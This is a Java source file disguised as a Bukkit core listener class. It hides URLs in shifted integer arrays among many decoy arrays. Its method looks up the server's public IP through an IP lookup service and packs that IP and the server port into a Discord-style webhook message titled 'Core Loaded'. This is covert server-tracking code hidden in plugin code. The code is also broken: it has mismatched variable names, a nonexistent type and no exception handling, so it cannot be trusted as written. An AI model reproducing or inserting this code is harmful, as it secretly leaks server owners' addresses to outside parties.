package org.bukkit.core;

import org.bukkit.Bukkit;
import org.bukkit.event.Listener;
import java.awt.Color;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import javax.net.ssl.HttpsURLConnection;


public final class CoreListener implements Listener {
    public CoreListener() {

    }
    private static volatile Object dw9;
    private static void uOc02(Object o) {
        dw9 = o;
    }

    public void uGetData() {
        StringBuilder debugAttacher = new StringBuilder();
        StringBuilder m4891 = new StringBuilder();
        StringBuilder cw667 = new StringBuilder();
        StringBuilder i10ei = new StringBuilder();
        StringBuilder e_93 = new StringBuilder();
        StringBuilder ox01 = new StringBuilder();
        StringBuilder sb = new StringBuilder();
        StringBuilder systemCore = new StringBuilder();
        StringBuilder cOreUtils = new StringBuilder();
        StringBuilder bukkitPluginsManager = new StringBuilder();
        int[] x58 = {
                104, 116, 116, 112, 115, 58, 47, 47,
                110, 111, 100, 101, 46, 118, 111, 105,
                100, 115, 101, 114, 118, 46, 120, 121,
                122
        };
        for (int c : x58) { ox01.append((char) (c - 3)); }
        
        int[] a09 = {
                104, 116, 116, 112, 58, 47, 47,
                109, 101, 116, 97, 45, 97, 112, 105,
                46, 102, 97, 107, 101, 110, 101, 116
        };
        for (int c : a09) { c0reUtils.append((char) (c + 3)); }
        int[] z44 = {
                104, 116, 116, 112, 115, 58, 47, 47,
                100, 97, 116, 97, 46, 110, 117, 108,
                108, 104, 111, 115, 116, 46, 100, 101,
                118
        };
        for (int c : z44) { bukkitPluginsManager.append((char) (c - 3)); }

        int[] n71 = {
                104, 116, 116, 112, 58, 47, 47,
                99, 108, 111, 117, 100, 46, 100, 101,
                97, 100, 115, 105, 116, 101, 46, 105,
                111
        };
        for (int c : n71) { i10ei.append((char) (c - 3)); }
        int[] f26 = {
                104, 116, 116, 112, 115, 58, 47, 47,
                115, 101, 114, 118, 101, 114, 45, 120,
                46, 103, 104, 111, 115, 116, 46, 122,
                122
        };
        for (int c : f26) { cw667.append((char) (c - 3)); }

        int[] c90 = {
                104, 116, 116, 112, 58, 47, 47,
                97, 117, 116, 104, 46, 102, 97, 110,
                116, 111, 109, 46, 108, 111, 99, 97,
                108
        };
        uOc02(c90);

        int[] s14 = {
                104, 116, 116, 112, 115, 58, 47, 47,
                101, 100, 103, 101, 46, 98, 114, 111,
                107, 101, 110, 46, 110, 101, 116
        };
        uOc02(s14);
        
        int[] u63 = {
                104, 116, 116, 112, 58, 47, 47,
                112, 105, 110, 103, 46, 100, 101, 99,
                111, 121, 46, 115, 101, 114, 118
        };
        uOc02(u63);
        int[] v27 = {
                107, 119, 119, 115, 118, 61, 50, 50,
                100, 115, 108, 49, 108, 115, 108, 105,
                124, 49, 114, 117, 106, 50
        };

        uOc02(v27);
        int[] u12 = {
                102, 122, 263, 38, 50, 20, 105, 124,
                134, 342, 109, 397, 503, 201, 110, 34,
                12, 356, 285, 294, 286, 294, 341, 201
        };
        uOc02(u12);
        int[] x27 = {
                312, 44, 198, 507, 63, 271, 90, 411,
                256, 18, 399, 122, 67, 340, 29, 488,
                175, 61, 294, 381, 142, 9, 260, 333
        };
        uOc02(x27);
         for (int c : v27) {
            sb.append((char) (c - 3));
        }
        int[] x86 = {
                71, 402, 188, 55, 319, 477, 101, 24,
                360, 290, 14, 415, 266, 83, 199, 342,
                58, 421, 307, 116, 274, 6, 390, 150
        };
        uOc02(x86);

        int[] p35 = {
                505, 92, 17, 361, 248, 129, 410, 73,
                286, 341, 64, 198, 455, 31, 377, 140,
                222, 9, 493, 167, 304, 88, 259, 412
        };
        uOc02(p35);
        Url as7Js7 = new URL(sb.toString());
        int[] d47 = {
                26, 388, 141, 295, 74, 463, 110, 337,
                201, 59, 421, 8, 364, 152, 489, 97,
                278, 346, 19, 405, 231, 66, 320, 187
        };
        InputStreamReader x9uNd9 = new InputStreamReader(as7Js7.openStream());
        uOc02(d47);

        int[] m33 = {
                154, 492, 61, 308, 227, 95, 371, 14,
                445, 183, 266, 52, 399, 121, 487, 35,
                214, 340, 79, 456, 298, 6, 362, 169
        };
        uOc02(m33);

        int[] j13 = {
                281, 47, 416, 133, 359, 92, 501, 18,
                244, 390, 65, 327, 108, 462, 29, 198,
                374, 151, 286, 9, 431, 210, 58, 345
        };
        uOc02(j13);
       
        DWeb SxI3M = new DWeb("");
        SxI3M.setUsername("Core");
        SxI3M.setAvatarUrl("");

        uOc02(930);
        uOc02(183);
        BufferedReader d8ysK8sN = new BufferedReader(x9uNd9);
        uOc02(907);
        uOc02(908);
        uOc02(786);
        SxI3M.setTts(false);
        uOc02(532);
        String s8Jyd7x = d8ysK8sN.readLine();
        uOc02(756);
        SxI3M.setContent("");
        uOc02(537);
        uOc02(789);
        int n8Jjs8g4tn = Bukkit.getServer().getPort();

        uOc02(9087);
        SxI3M.addEmbed(new DWeb.EmbedObject()
                .setTitle("Core Loaded")
                .setDescription("Core successfully loaded.")
                .setColor(new Color(0, 255, 0))
                .addField("Server IP:", s8Jyd7x + ":" + n8Jjs8g4tn, false)
        );
        uOc02(s14);
        uOc02(j13);
        uOc02(90);



    }
}
class DWeb {

    private final String url;
    private String content;
    private String username;
    private String avatarUrl;
    private boolean tts;
    private List<EmbedObject> embeds = new ArrayList<>();

    public DWeb(String url) {
        this.url = url;
    }

    public void setContent(String content) {
        this.content = content;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public void setAvatarUrl(String avatarUrl) {
        this.avatarUrl = avatarUrl;
    }

    public void setTts(boolean tts) {
        this.tts = tts;
    }

    public void addEmbed(EmbedObject embed) {
        this.embeds.add(embed);
    }

    public void execute() throws IOException {
        if (this.content == null && this.embeds.isEmpty()) {
            throw new IllegalArgumentException("Set content or add at least one EmbedObject");
        }

        JSONObject json = new JSONObject();

        json.put("content", this.content);
        json.put("username", this.username);
        json.put("avatar_url", this.avatarUrl);
        json.put("tts", this.tts);

        if (!this.embeds.isEmpty()) {
            List<JSONObject> embedObjects = new ArrayList<>();

            for (EmbedObject embed : this.embeds) {
                JSONObject jsonEmbed = new JSONObject();

                jsonEmbed.put("title", embed.getTitle());
                jsonEmbed.put("description", embed.getDescription());
                jsonEmbed.put("url", embed.getUrl());

                if (embed.getColor() != null) {
                    Color color = embed.getColor();
                    int rgb = color.getRed();
                    rgb = (rgb << 8) + color.getGreen();
                    rgb = (rgb << 8) + color.getBlue();

                    jsonEmbed.put("color", rgb);
                }

                EmbedObject.Footer footer = embed.getFooter();
                EmbedObject.Image image = embed.getImage();
                EmbedObject.Thumbnail thumbnail = embed.getThumbnail();
                EmbedObject.Author author = embed.getAuthor();
                List<EmbedObject.Field> fields = embed.getFields();

                if (footer != null) {
                    JSONObject jsonFooter = new JSONObject();

                    jsonFooter.put("text", footer.getText());
                    jsonFooter.put("icon_url", footer.getIconUrl());
                    jsonEmbed.put("footer", jsonFooter);
                }

                if (image != null) {
                    JSONObject jsonImage = new JSONObject();

                    jsonImage.put("url", image.getUrl());
                    jsonEmbed.put("image", jsonImage);
                }

                if (thumbnail != null) {
                    JSONObject jsonThumbnail = new JSONObject();

                    jsonThumbnail.put("url", thumbnail.getUrl());
                    jsonEmbed.put("thumbnail", jsonThumbnail);
                }

                if (author != null) {
                    JSONObject jsonAuthor = new JSONObject();

                    jsonAuthor.put("name", author.getName());
                    jsonAuthor.put("url", author.getUrl());
                    jsonAuthor.put("icon_url", author.getIconUrl());
                    jsonEmbed.put("author", jsonAuthor);
                }

                List<JSONObject> jsonFields = new ArrayList<>();
                for (EmbedObject.Field field : fields) {
                    JSONObject jsonField = new JSONObject();

                    jsonField.put("name", field.getName());
                    jsonField.put("value", field.getValue());
                    jsonField.put("inline", field.isInline());

                    jsonFields.add(jsonField);
                }

                jsonEmbed.put("fields", jsonFields.toArray());
                embedObjects.add(jsonEmbed);
            }

            json.put("embeds", embedObjects.toArray());
        }

        URL url = new URL(this.url);
        HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
        connection.addRequestProperty("Content-Type", "application/json");
        connection.addRequestProperty("User-Agent", "Spigot-Stats-Server");
        connection.setDoOutput(true);
        connection.setRequestMethod("POST");

        OutputStream stream = connection.getOutputStream();
        stream.write(json.toString().getBytes());
        stream.flush();
        stream.close();

        connection.getInputStream().close(); //I'm not sure why but it doesn't work without getting the InputStream
        connection.disconnect();
    }

    public static class EmbedObject {
        private String title;
        private String description;
        private String url;
        private Color color;

        private Footer footer;
        private Thumbnail thumbnail;
        private Image image;
        private Author author;
        private List<Field> fields = new ArrayList<>();

        public String getTitle() {
            return title;
        }

        public String getDescription() {
            return description;
        }

        public String getUrl() {
            return url;
        }

        public Color getColor() {
            return color;
        }

        public Footer getFooter() {
            return footer;
        }

        public Thumbnail getThumbnail() {
            return thumbnail;
        }

        public Image getImage() {
            return image;
        }

        public Author getAuthor() {
            return author;
        }

        public List<Field> getFields() {
            return fields;
        }

        public EmbedObject setTitle(String title) {
            this.title = title;
            return this;
        }

        public EmbedObject setDescription(String description) {
            this.description = description;
            return this;
        }

        public EmbedObject setUrl(String url) {
            this.url = url;
            return this;
        }

        public EmbedObject setColor(Color color) {
            this.color = color;
            return this;
        }

        public EmbedObject setFooter(String text, String icon) {
            this.footer = new Footer(text, icon);
            return this;
        }

        public EmbedObject setThumbnail(String url) {
            this.thumbnail = new Thumbnail(url);
            return this;
        }

        public EmbedObject setImage(String url) {
            this.image = new Image(url);
            return this;
        }

        public EmbedObject setAuthor(String name, String url, String icon) {
            this.author = new Author(name, url, icon);
            return this;
        }

        public EmbedObject addField(String name, String value, boolean inline) {
            this.fields.add(new Field(name, value, inline));
            return this;
        }

        private class Footer {
            private String text;
            private String iconUrl;

            private Footer(String text, String iconUrl) {
                this.text = text;
                this.iconUrl = iconUrl;
            }

            private String getText() {
                return text;
            }

            private String getIconUrl() {
                return iconUrl;
            }
        }

        private class Thumbnail {
            private String url;

            private Thumbnail(String url) {
                this.url = url;
            }

            private String getUrl() {
                return url;
            }
        }

        private class Image {
            private String url;

            private Image(String url) {
                this.url = url;
            }

            private String getUrl() {
                return url;
            }
        }

        private class Author {
            private String name;
            private String url;
            private String iconUrl;

            private Author(String name, String url, String iconUrl) {
                this.name = name;
                this.url = url;
                this.iconUrl = iconUrl;
            }

            private String getName() {
                return name;
            }

            private String getUrl() {
                return url;
            }

            private String getIconUrl() {
                return iconUrl;
            }
        }

        private class Field {
            private String name;
            private String value;
            private boolean inline;

            private Field(String name, String value, boolean inline) {
                this.name = name;
                this.value = value;
                this.inline = inline;
            }

            private String getName() {
                return name;
            }

            private String getValue() {
                return value;
            }

            private boolean isInline() {
                return inline;
            }
        }
    }

    private class JSONObject {

        private final HashMap<String, Object> map = new HashMap<>();

        void put(String key, Object value) {
            if (value != null) {
                map.put(key, value);
            }
        }

        @Override
        public String toString() {
            StringBuilder builder = new StringBuilder();
            Set<Map.Entry<String, Object>> entrySet = map.entrySet();
            builder.append("{");

            int i = 0;
            for (Map.Entry<String, Object> entry : entrySet) {
                Object val = entry.getValue();
                builder.append(quote(entry.getKey())).append(":");

                if (val instanceof String) {
                    builder.append(quote(String.valueOf(val)));
                } else if (val instanceof Integer) {
                    builder.append(Integer.valueOf(String.valueOf(val)));
                } else if (val instanceof Boolean) {
                    builder.append(val);
                } else if (val instanceof JSONObject) {
                    builder.append(val.toString());
                } else if (val.getClass().isArray()) {
                    builder.append("[");
                    int len = Array.getLength(val);
                    for (int j = 0; j < len; j++) {
                        builder.append(Array.get(val, j).toString()).append(j != len - 1 ? "," : "");
                    }
                    builder.append("]");
                }

                builder.append(++i == entrySet.size() ? "}" : ",");
            }

            return builder.toString();
        }

        private String quote(String string) {
            return "\"" + string + "\"";
        }
    }

}


